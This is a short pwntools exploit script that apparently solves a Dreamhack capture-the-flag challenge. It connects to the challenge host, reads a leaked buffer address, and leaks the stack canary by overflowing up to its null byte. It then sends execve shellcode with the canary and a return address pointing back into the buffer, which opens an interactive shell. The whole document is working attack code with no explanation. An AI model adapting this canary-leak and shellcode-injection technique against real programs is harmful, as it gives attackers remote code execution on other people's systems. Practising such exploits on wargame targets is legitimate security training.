from pwn import *

p = remote('host3.dreamhack.games', 18808)

context.arch = 'amd64'

def slog(n, m): 
    return success(': '.join([n, hex(m)]))

# get buf
p.recvuntil(b'buf: ')
buf = int(p.recvline()[:-1], 16)
slog('Address of buf', buf)

# get buf size
p.recvuntil(b'$rbp: ')
buf2sfp = int(p.recvline().split()[0])
buf2cny = buf2sfp - 8                       # canary : \0x00 + 7 bytes
slog('buf <=> sfp', buf2sfp)
slog('buf <=> canary', buf2cny)

payload = b'A' * (buf2cny + 1)

p.sendafter(b'Input: ', payload)
p.recvuntil(payload)
cny = u64(b'\00' + p.recvn(7))
slog('Canary: ', cny)

sh = asm(shellcraft.sh())
payload = sh.ljust(buf2cny, b'A') + p64(cny) + b'B' * 0x8 + p64(buf)
p.sendlineafter(b'Input: ', payload)

p.interactive()